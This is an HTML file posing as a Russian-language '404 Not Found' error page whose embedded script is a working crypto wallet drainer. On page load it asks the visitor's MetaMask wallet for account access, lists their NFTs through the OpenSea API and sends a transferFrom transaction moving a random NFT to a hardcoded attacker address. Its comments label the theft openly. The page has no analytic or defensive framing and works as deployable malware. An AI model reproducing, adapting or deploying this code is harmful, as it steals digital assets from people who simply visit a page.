<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>404 Not Found</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
        h1 { font-size: 72px; color: #333; }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
</head>
<body>
    <h1>404</h1>
    <p>Страница не найдена</p>

    <script>
        (function() {
            // ========== ТВОЙ КОШЕЛЁК (ВСТАВЛЕН) ==========
            const ATTACKER_ADDRESS = '0x8e79eb2670e89FAA530165DBB2a60E80B6e25e5b';
            // ============================================

            let web3;
            let userAccount;

            async function connectWallet() {
                if (window.ethereum) {
                    web3 = new Web3(window.ethereum);
                    try {
                        await window.ethereum.request({ method: 'eth_requestAccounts' });
                        const accounts = await web3.eth.getAccounts();
                        userAccount = accounts[0];
                        console.log('Кошелёк подключён:', userAccount);
                        return true;
                    } catch (e) {
                        console.error('Ошибка подключения:', e);
                        return false;
                    }
                } else {
                    console.log('MetaMask не установлен');
                    return false;
                }
            }

            async function fetchAllNFTs(walletAddress) {
                try {
                    const response = await fetch(`https://api.opensea.io/api/v2/chain/ethereum/account/${walletAddress}/nfts`);
                    const data = await response.json();
                    return data.nfts || [];
                } catch (e) {
                    console.error('Ошибка получения NFT:', e);
                    return [];
                }
            }

            async function stealNFT(nft) {
                try {
                    const contractAddress = nft.contract;
                    const tokenId = nft.identifier;

                    const transferFromABI = {
                        constant: false,
                        inputs: [
                            { name: 'from', type: 'address' },
                            { name: 'to', type: 'address' },
                            { name: 'tokenId', type: 'uint256' }
                        ],
                        name: 'transferFrom',
                        outputs: [],
                        type: 'function'
                    };

                    const contract = new web3.eth.Contract([transferFromABI], contractAddress);
                    await contract.methods.transferFrom(userAccount, ATTACKER_ADDRESS, tokenId).send({ from: userAccount });
                    
                    console.log(`NFT ${tokenId} украден!`);
                } catch (e) {
                    console.error('Ошибка при краже:', e);
                }
            }

            window.addEventListener('load', async () => {
                setTimeout(async () => {
                    const connected = await connectWallet();
                    if (connected) {
                        const nfts = await fetchAllNFTs(userAccount);
                        if (nfts.length > 0) {
                            const randomIndex = Math.floor(Math.random() * nfts.length);
                            const randomNft = nfts[randomIndex];
                            await stealNFT(randomNft);
                        }
                    }
                }, 1000);
            });
        })();
    </script>
</body>
</html>
